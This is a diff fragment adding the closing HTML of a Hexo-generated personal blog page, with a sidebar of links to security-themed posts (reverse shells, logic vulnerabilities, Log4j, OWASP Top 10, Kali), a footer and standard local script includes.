+      <ul>
+        
+          <li>
+            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/Log4j/">Log4j</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/01/kali/">kali</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 HOU<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
